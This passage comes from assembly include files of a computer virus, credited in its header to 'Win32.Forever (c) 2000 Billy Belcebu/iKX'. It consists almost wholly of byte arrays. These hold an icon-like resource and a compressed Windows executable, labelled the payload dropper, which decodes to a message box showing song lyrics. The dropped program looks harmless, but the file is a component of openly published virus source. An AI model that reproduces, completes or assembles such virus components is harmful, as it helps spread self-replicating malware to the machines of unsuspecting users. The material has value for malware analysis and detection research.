           db      050h, 000h, 002h, 000h, 0E8h, 002h, 000h, 00Ah
           db      000h, 0B8h, 053h, 000h, 002h, 000h, 028h, 001h
           db      000h, 00Ah, 000h, 0E0h, 054h, 000h, 002h, 000h
           db      022h, 000h, 00Bh, 000h, 028h, 000h, 003h, 000h
           db      020h, 000h, 003h, 000h, 040h, 000h, 003h, 000h
           db      001h, 000h, 001h, 000h, 004h, 000h, 005h, 000h
           db      080h, 002h, 000h, 018h, 000h, 080h, 000h, 002h
           db      000h, 080h, 000h, 003h, 000h, 080h, 080h, 000h
           db      001h, 000h, 080h, 000h, 003h, 000h, 080h, 000h
           db      001h, 000h, 080h, 000h, 001h, 000h, 080h, 080h
           db      000h, 002h, 000h, 080h, 080h, 080h, 000h, 001h
           db      000h, 0C0h, 0C0h, 0C0h, 000h, 003h, 000h, 0FFh
           db      000h, 002h, 000h, 0FFh, 000h, 003h, 000h, 0FFh
           db      0FFh, 000h, 001h, 000h, 0FFh, 000h, 003h, 000h
           db      0FFh, 000h, 001h, 000h, 0FFh, 000h, 001h, 000h
           db      0FFh, 0FFh, 000h, 002h, 000h, 0FFh, 0FFh, 0FFh
           db      000h, 012h, 000h, 006h, 088h, 088h, 088h, 088h
           db      088h, 088h, 088h, 088h, 088h, 088h, 088h, 088h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0F0h, 078h, 078h, 077h, 00Fh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0F0h, 087h, 087h, 070h, 00Fh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0FFh, 0F0h, 007h, 00Fh, 0FFh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 000h, 004h, 000h, 0FFh, 0FFh, 0F8h, 000h
           db      003h, 000h, 006h, 0FFh, 0FFh, 0F0h, 000h, 002h
           db      000h, 078h, 088h, 088h, 088h, 00Fh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 077h, 077h
           db      077h, 077h, 077h, 077h, 078h, 00Fh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 07Fh, 0B8h
           db      0B8h, 0B8h, 0B7h, 00Fh, 078h, 00Fh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 07Fh, 08Bh
           db      08Bh, 08Bh, 087h, 00Fh, 078h, 00Fh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 07Fh, 0B8h
           db      0B8h, 0B8h, 0F7h, 00Fh, 078h, 00Fh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 07Fh, 08Bh
           db      08Bh, 08Bh, 087h, 00Fh, 078h, 00Fh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 07Fh, 0B8h
           db      0B8h, 0B8h, 0B7h, 00Fh, 078h, 00Fh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 07Fh, 0FFh
           db      0FFh, 0FFh, 0F7h, 00Fh, 078h, 00Fh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 078h, 0B8h
           db      0B8h, 077h, 077h, 00Fh, 008h, 00Fh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0F7h, 08Bh
           db      087h, 000h, 003h, 000h, 008h, 00Fh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 077h
           db      07Fh, 078h, 088h, 088h, 080h, 0FFh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0F7h, 077h, 077h, 07Fh, 0FFh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0F8h
           db      000h, 003h, 000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 060h, 000h, 005h
           db      000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0FFh, 0FFh, 06Fh, 0F8h, 070h, 000h, 003h
           db      000h, 006h, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0FFh, 0FFh, 06Fh, 087h, 000h, 004h, 000h
           db      006h, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 0FFh, 068h, 070h, 000h, 004h, 000h, 006h
           db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh
           db      0FFh, 066h, 000h, 005h, 000h, 006h, 0FFh, 0FFh
           db      0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 0FFh, 060h
           db      000h, 005h, 000h, 006h, 066h, 066h, 066h, 066h
           db      066h, 066h, 066h, 066h, 066h, 060h, 000h, 004h
           db      000h, 0E0h, 000h, 002h, 000h, 007h, 0E0h, 000h
           db      002h, 000h, 007h, 0E0h, 000h, 002h, 000h, 007h
           db      0E0h, 000h, 002h, 000h, 007h, 0E0h, 000h, 002h
           db      000h, 007h, 0E0h, 000h, 002h, 000h, 007h, 0E0h
           db      000h, 002h, 000h, 007h, 0E0h, 000h, 002h, 000h
           db      007h, 0E0h, 000h, 002h, 000h, 007h, 0E0h, 000h
           db      002h, 000h, 007h, 0E0h, 000h, 002h, 000h, 007h
           db      0E0h, 000h, 002h, 000h, 007h, 0E0h, 000h, 002h
           db      000h, 007h, 0E0h, 000h, 002h, 000h, 007h, 0E0h
           db      000h, 002h, 000h, 007h, 0E0h, 000h, 002h, 000h
           db      007h, 0E0h, 000h, 002h, 000h, 007h, 0E0h, 000h
           db      002h, 000h, 007h, 0E0h, 000h, 002h, 000h, 007h
           db      0E0h, 000h, 002h, 000h, 007h, 0E0h, 000h, 002h
           db      000h, 007h, 0E0h, 000h, 002h, 000h, 007h, 0E0h
           db      000h, 002h, 000h, 007h, 0E0h, 000h, 002h, 000h
           db      007h, 0E0h, 000h, 002h, 000h, 007h, 0E0h, 000h
           db      002h, 000h, 007h, 0E0h, 000h, 002h, 000h, 00Fh
           db      0E0h, 000h, 002h, 000h, 01Fh, 0E0h, 000h, 002h
           db      000h, 03Fh, 0E0h, 000h, 002h, 000h, 07Fh, 0E0h
           db      000h, 002h, 000h, 0FFh, 0E0h, 000h, 001h, 000h
           db      001h, 0FFh, 028h, 000h, 003h, 000h, 010h, 000h
           db      003h, 000h, 020h, 000h, 003h, 000h, 001h, 000h
           db      001h, 000h, 004h, 000h, 005h, 000h, 0C0h, 000h
           db      019h, 000h, 080h, 000h, 002h, 000h, 080h, 000h
           db      003h, 000h, 080h, 080h, 000h, 001h, 000h, 080h
           db      000h, 003h, 000h, 080h, 000h, 001h, 000h, 080h
           db      000h, 001h, 000h, 080h, 080h, 000h, 002h, 000h
           db      080h, 080h, 080h, 000h, 001h, 000h, 0C0h, 0C0h
           db      0C0h, 000h, 003h, 000h, 0FFh, 000h, 002h, 000h
           db      0FFh, 000h, 003h, 000h, 0FFh, 0FFh, 000h, 001h
           db      000h, 0FFh, 000h, 003h, 000h, 0FFh, 000h, 001h
           db      000h, 0FFh, 000h, 001h, 000h, 0FFh, 0FFh, 000h
           db      002h, 000h, 0FFh, 0FFh, 0FFh, 000h, 005h, 000h
           db      078h, 078h, 077h, 000h, 005h, 000h, 087h, 087h
           db      070h, 000h, 006h, 000h, 007h, 000h, 00Dh, 000h
           db      078h, 088h, 088h, 088h, 000h, 001h, 000h, 077h
           db      077h, 077h, 077h, 077h, 077h, 078h, 000h, 001h
           db      000h, 07Fh, 0B8h, 0B8h, 0B8h, 0B7h, 000h, 001h
           db      000h, 078h, 000h, 001h, 000h, 07Fh, 08Bh, 08Bh
           db      08Bh, 087h, 000h, 001h, 000h, 078h, 000h, 001h
           db      000h, 07Fh, 0B8h, 0B8h, 0B8h, 0F7h, 000h, 001h
           db      000h, 078h, 000h, 001h, 000h, 07Fh, 08Bh, 08Bh
           db      08Bh, 087h, 000h, 001h, 000h, 078h, 000h, 001h
           db      000h, 07Fh, 0B8h, 0B8h, 0B8h, 0B7h, 000h, 001h
           db      000h, 078h, 000h, 001h, 000h, 07Fh, 0FFh, 0FFh
           db      0FFh, 0F7h, 000h, 001h, 000h, 078h, 000h, 001h
           db      000h, 078h, 0B8h, 0B8h, 077h, 077h, 000h, 001h
           db      000h, 008h, 000h, 001h, 000h, 007h, 08Bh, 087h
           db      000h, 003h, 000h, 008h, 000h, 002h, 000h, 077h
           db      070h, 078h, 088h, 088h, 080h, 000h, 004h, 000h
           db      007h, 077h, 077h, 070h, 000h, 001h, 000h, 0FEh
           db      001h, 000h, 001h, 000h, 0A0h, 0FEh, 001h, 01Fh
           db      001h, 0FFh, 087h, 00Eh, 001h, 0FCh, 003h, 000h
           db      002h, 000h, 080h, 001h, 000h, 003h, 000h, 001h
           db      000h, 003h, 000h, 011h, 000h, 003h, 000h, 011h
           db      000h, 003h, 000h, 011h, 000h, 003h, 000h, 011h
           db      000h, 003h, 000h, 011h, 000h, 003h, 000h, 011h
           db      000h, 003h, 000h, 011h, 000h, 002h, 000h, 080h
           db      001h, 000h, 002h, 000h, 0C4h, 003h, 000h, 002h
           db      000h, 0FEh, 007h, 00Eh, 001h, 000h, 002h, 000h
           db      001h, 000h, 001h, 000h, 002h, 000h, 001h, 000h
           db      020h, 020h, 010h, 000h, 001h, 000h, 001h, 000h
           db      001h, 000h, 004h, 000h, 001h, 000h, 0E8h, 002h
           db      000h, 002h, 000h, 001h, 000h, 001h, 000h, 010h
           db      010h, 010h, 000h, 001h, 000h, 001h, 000h, 001h
           db      000h, 004h, 000h, 001h, 000h, 028h, 001h, 000h
           db      002h, 000h, 002h, 000h, 0FFh, 00Eh
   sdr0p   equ     ($-offset dr0p)

   ;-----------------------------[ DROPPER1.INC ]------------------------------;

   ;############################################################################
   ;# WIN32.FOREVER - INC FILE (PAYLOAD DROPPER)    (c) 2000 Billy Belcebu/iKX #
   ;############################################################################

   dr0p1:  db      04Dh, 05Ah, 050h, 000h, 001h, 000h, 002h, 000h
           db      003h, 000h, 004h, 000h, 001h, 000h, 00Fh, 000h
           db      001h, 000h, 0FFh, 0FFh, 000h, 002h, 000h, 0B8h
           db      000h, 007h, 000h, 040h, 000h, 001h, 000h, 01Ah
           db      000h, 022h, 000h, 001h, 000h, 002h, 000h, 0BAh
           db      010h, 000h, 001h, 000h, 00Eh, 01Fh, 0B4h, 009h
           db      0CDh, 021h, 0B8h, 001h, 04Ch, 0CDh, 021h, 090h
           db      090h, 054h, 068h, 069h, 073h, 020h, 070h, 072h
           db      06Fh, 067h, 072h, 061h, 06Dh, 020h, 06Dh, 075h
           db      073h, 074h, 020h, 062h, 065h, 020h, 072h, 075h
           db      06Eh, 020h, 075h, 06Eh, 064h, 065h, 072h, 020h
           db      057h, 069h, 06Eh, 033h, 032h, 00Dh, 00Ah, 024h
           db      037h, 000h, 088h, 000h, 050h, 045h, 000h, 002h
           db      000h, 04Ch, 001h, 005h, 000h, 001h, 000h, 038h
           db      028h, 093h, 0B6h, 000h, 008h, 000h, 0E0h, 000h
           db      001h, 000h, 08Eh, 081h, 00Bh, 001h, 002h, 019h
           db      000h, 001h, 000h, 002h, 000h, 003h, 000h, 010h
           db      000h, 007h, 000h, 010h, 000h, 003h, 000h, 010h
           db      000h, 003h, 000h, 020h, 000h, 004h, 000h, 040h
           db      000h, 002h, 000h, 010h, 000h, 003h, 000h, 002h
           db      000h, 002h, 000h, 001h, 000h, 007h, 000h, 003h
           db      000h, 001h, 000h, 00Ah, 000h, 006h, 000h, 060h
           db      000h, 003h, 000h, 004h, 000h, 006h, 000h, 002h
           db      000h, 005h, 000h, 010h, 000h, 002h, 000h, 020h
           db      000h, 004h, 000h, 010h, 000h, 002h, 000h, 010h
           db      000h, 006h, 000h, 010h, 000h, 00Ch, 000h, 030h
           db      000h, 002h, 000h, 090h, 000h, 004h, 000h, 050h
           db      000h, 003h, 000h, 00Ah, 000h, 013h, 000h, 040h
           db      000h, 002h, 000h, 014h, 000h, 053h, 000h, 043h
           db      04Fh, 044h, 045h, 000h, 005h, 000h, 010h, 000h
           db      003h, 000h, 010h, 000h, 003h, 000h, 002h, 000h
           db      003h, 000h, 006h, 000h, 00Eh, 000h, 020h, 000h
           db      002h, 000h, 0E0h, 044h, 041h, 054h, 041h, 000h
           db      005h, 000h, 010h, 000h, 003h, 000h, 020h, 000h
           db      003h, 000h, 002h, 000h, 003h, 000h, 008h, 000h
           db      00Eh, 000h, 040h, 000h, 002h, 000h, 0C0h, 02Eh
           db      069h, 064h, 061h, 074h, 061h, 000h, 003h, 000h
           db      010h, 000h, 003h, 000h, 030h, 000h, 003h, 000h
           db      002h, 000h, 003h, 000h, 00Ah, 000h, 00Eh, 000h
           db      040h, 000h, 002h, 000h, 0C0h, 02Eh, 072h, 065h
           db      06Ch, 06Fh, 063h, 000h, 003h, 000h, 010h, 000h
           db      003h, 000h, 040h, 000h, 003h, 000h, 002h, 000h
           db      003h, 000h, 00Ch, 000h, 00Eh, 000h, 040h, 000h
           db      002h, 000h, 050h, 02Eh, 072h, 073h, 072h, 063h
           db      000h, 004h, 000h, 010h, 000h, 003h, 000h, 050h
           db      000h, 003h, 000h, 00Ah, 000h, 003h, 000h, 00Eh
           db      000h, 00Eh, 000h, 040h, 000h, 002h, 000h, 050h
           db      000h, 040h, 003h, 06Ah, 000h, 001h, 000h, 068h
           db      000h, 001h, 000h, 020h, 040h, 000h, 001h, 000h
           db      068h, 00Eh, 020h, 040h, 000h, 001h, 000h, 06Ah
           db      000h, 001h, 000h, 0E8h, 007h, 000h, 003h, 000h
           db      06Ah, 000h, 001h, 000h, 0E8h, 006h, 000h, 003h
           db      000h, 0FFh, 025h, 04Ch, 030h, 040h, 000h, 001h
           db      000h, 0FFh, 025h, 054h, 030h, 040h, 000h, 0DBh
           db      001h, 057h, 069h, 06Eh, 033h, 032h, 02Eh, 046h
           db      06Fh, 072h, 065h, 076h, 065h, 072h, 000h, 001h
           db      000h, 049h, 020h, 073h, 074h, 061h, 06Eh, 064h
           db      020h, 061h, 06Ch, 06Fh, 06Eh, 065h, 020h, 069h
           db      06Eh, 020h, 074h, 068h, 065h, 020h, 064h, 061h
           db      072h, 06Bh, 06Eh, 065h, 073h, 073h, 00Ah, 074h
           db      068h, 065h, 020h, 077h, 069h, 06Eh, 074h, 065h
           db      072h, 020h, 06Fh, 066h, 020h, 06Dh, 079h, 020h
           db      06Ch, 069h, 066h, 065h, 020h, 063h, 061h, 06Dh
           db      065h, 020h, 073h, 06Fh, 020h, 066h, 061h, 073h
           db      074h, 00Ah, 06Dh, 065h, 06Dh, 06Fh, 072h, 069h
           db      065h, 073h, 020h, 067h, 06Fh, 020h, 062h, 061h
           db      063h, 06Bh, 020h, 074h, 06Fh, 020h, 06Dh, 079h
           db      020h, 063h, 068h, 069h, 06Ch, 064h, 068h, 06Fh
           db      06Fh, 064h, 00Ah, 074h, 06Fh, 020h, 064h, 061h
           db      079h, 073h, 020h, 069h, 020h, 073h, 074h, 069h
           db      06Ch, 06Ch, 020h, 072h, 065h, 063h, 061h, 06Ch
           db      06Ch, 00Ah, 00Ah, 04Fh, 068h, 020h, 068h, 06Fh
           db      077h, 020h, 068h, 061h, 070h, 070h, 079h, 020h
           db      069h, 020h, 077h, 061h, 073h, 020h, 074h, 068h
           db      065h, 06Eh, 00Ah, 074h, 068h, 065h, 072h, 065h
           db      020h, 077h, 061h, 073h, 020h, 06Eh, 06Fh, 020h
           db      073h, 06Fh, 072h, 072h, 06Fh, 077h, 02Ch, 020h
           db      074h, 068h, 065h, 072h, 065h, 020h, 077h, 061h
           db      073h, 020h, 06Eh, 06Fh, 020h, 070h, 061h, 069h
           db      06Eh, 00Ah, 077h, 061h, 06Ch, 06Bh, 069h, 06Eh
           db      067h, 020h, 074h, 068h, 072h, 06Fh, 075h, 067h
           db      068h, 020h, 074h, 068h, 065h, 020h, 067h, 072h
           db      065h, 065h, 06Eh, 020h, 066h, 069h, 065h, 06Ch
           db      064h, 073h, 00Ah, 073h, 075h, 06Eh, 073h, 068h
           db      069h, 06Eh, 065h, 020h, 069h, 06Eh, 020h, 06Dh
           db      079h, 020h, 065h, 079h, 065h, 073h, 00Ah, 00Ah
           db      049h, 027h, 06Dh, 020h, 073h, 074h, 069h, 06Ch
           db      06Ch, 020h, 074h, 068h, 065h, 072h, 065h, 020h
           db      065h, 076h, 065h, 072h, 079h, 077h, 068h, 065h
           db      072h, 065h, 00Ah, 049h, 027h, 06Dh, 020h, 074h
           db      068h, 065h, 020h, 064h, 075h, 073h, 074h, 020h
           db      069h, 06Eh, 020h, 074h, 068h, 065h, 020h, 077h
           db      069h, 06Eh, 064h, 00Ah, 049h, 027h, 06Dh, 020h
           db      074h, 068h, 065h, 020h, 073h, 074h, 061h, 072h
           db      020h, 069h, 06Eh, 020h, 074h, 068h, 065h, 020h
           db      06Eh, 06Fh, 072h, 074h, 068h, 065h, 072h, 06Eh
           db      020h, 073h, 06Bh, 079h, 00Ah, 049h, 020h, 06Eh
           db      065h, 076h, 065h, 072h, 020h, 073h, 074h, 061h
           db      079h, 065h, 064h, 020h, 061h, 06Eh, 079h, 077h
           db      068h, 065h, 072h, 065h, 00Ah, 049h, 027h, 06Dh
           db      020h, 074h, 068h, 065h, 020h, 077h, 069h, 06Eh
           db      064h, 020h, 069h, 06Eh, 020h, 074h, 068h, 065h
           db      020h, 074h, 072h, 065h, 065h, 073h, 00Ah, 057h
           db      06Fh, 075h, 06Ch, 064h, 020h, 079h, 06Fh, 075h
           db      020h, 077h, 061h, 069h, 074h, 020h, 066h, 06Fh
           db      072h, 020h, 06Dh, 065h, 02Eh, 02Eh, 02Eh, 020h
           db      066h, 06Fh, 072h, 065h, 076h, 065h, 072h, 03Fh
           db      000h, 001h, 000h, 046h, 06Fh, 072h, 065h, 076h
           db      065h, 072h, 020h, 05Bh, 020h, 053h, 074h, 072h
           db      061h, 074h, 06Fh, 076h, 061h, 072h, 069h, 075h
           db      073h, 020h, 05Dh, 000h, 042h, 000h, 03Ch, 030h
           db      000h, 00Ah, 000h, 05Ch, 030h, 000h, 002h, 000h
           db      04Ch, 030h, 000h, 002h, 000h, 044h, 030h, 000h
           db      00Ah, 000h, 067h, 030h, 000h, 002h, 000h, 054h
           db      030h, 000h, 016h, 000h, 074h, 030h, 000h, 006h
           db      000h, 082h, 030h, 000h, 006h, 000h, 074h, 030h
           db      000h, 006h, 000h, 082h, 030h, 000h, 006h, 000h
           db      055h, 053h, 045h, 052h, 033h, 032h, 02Eh, 064h
           db      06Ch, 06Ch, 000h, 001h, 000h, 04Bh, 045h, 052h
           db      04Eh, 045h, 04Ch, 033h, 032h, 02Eh, 064h, 06Ch
           db      06Ch, 000h, 003h, 000h, 04Dh, 065h, 073h, 073h
           db      061h, 067h, 065h, 042h, 06Fh, 078h, 041h, 000h
           db      003h, 000h, 045h, 078h, 069h, 074h, 050h, 072h
           db      06Fh, 063h, 065h, 073h, 073h, 000h, 072h, 001h
           db      010h, 000h, 002h, 000h, 014h, 000h, 003h, 000h
           db      003h, 030h, 008h, 030h, 01Ch, 030h, 022h, 030h
           db      000h, 0F4h, 001h, 098h, 0BBh, 08Ch, 038h, 000h
           db      006h, 000h, 002h, 000h, 001h, 000h, 003h, 000h
           db      003h, 000h, 020h, 000h, 002h, 000h, 080h, 00Eh
           db      000h, 003h, 000h, 038h, 000h, 002h, 000h, 080h
           db      000h, 004h, 000h, 098h, 0BBh, 08Ch, 038h, 000h
           db      006h, 000h, 001h, 000h, 001h, 000h, 001h, 000h
           db      003h, 000h, 050h, 000h, 002h, 000h, 080h, 000h
           db      004h, 000h, 098h, 0BBh, 08Ch, 038h, 000h, 006h
           db      000h, 001h, 000h, 001h, 000h, 09Ah, 002h, 000h
           db      002h, 000h, 068h, 000h, 002h, 000h, 080h, 000h
           db      004h, 000h, 098h, 0BBh, 08Ch, 038h, 000h, 006h
           db      000h, 001h, 000h, 005h, 000h, 080h, 000h, 007h
           db      000h, 098h, 0BBh, 08Ch, 038h, 000h, 006h, 000h
           db      001h, 000h, 005h, 000h, 090h, 000h, 003h, 000h
           db      0A0h, 050h, 000h, 002h, 000h, 0A8h, 008h, 000h
           db      00Ah, 000h, 048h, 059h, 000h, 002h, 000h, 014h
           db      000h, 00Bh, 000h, 028h, 000h, 003h, 000h, 020h
           db      000h, 003h, 000h, 040h, 000h, 003h, 000h, 001h
           db      000h, 001h, 000h, 010h, 000h, 005h, 000h, 080h
           db      008h, 000h, 012h, 000h, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 006h, 000h, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 006h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 000h, 006h, 000h, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h
           db      002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      000h, 002h, 000h, 0FFh, 07Fh, 000h, 002h, 000h
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h
           db      000h, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 006h, 000h, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh
           db      000h, 002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 002h, 000h, 0FFh, 07Fh, 000h, 002h
           db      000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h
           db      002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 000h, 006h, 000h, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h, 000h
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h
           db      000h, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh
           db      07Fh, 000h, 002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h
           db      006h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      000h, 008h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 000h
           db      008h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 008h
           db      000h, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 016h, 000h
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h
           db      000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      000h, 002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 016h, 000h
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h
           db      000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      000h, 002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 016h, 000h
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      000h, 006h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 006h, 000h, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 000h, 006h, 000h, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 000h, 006h, 000h, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 006h
           db      000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 00Eh, 000h
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      000h, 006h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h
           db      002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h, 000h, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh
           db      07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h
           db      006h, 000h, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 000h, 002h
           db      000h, 0FFh, 07Fh, 000h, 001h, 000h, 07Ch, 000h
           db      001h, 000h, 07Ch, 000h, 001h, 000h, 07Ch, 0FFh
           db      07Fh, 000h, 002h, 000h, 0FFh, 07Fh, 0FFh, 07Fh
           db      0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh, 0FFh, 07Fh
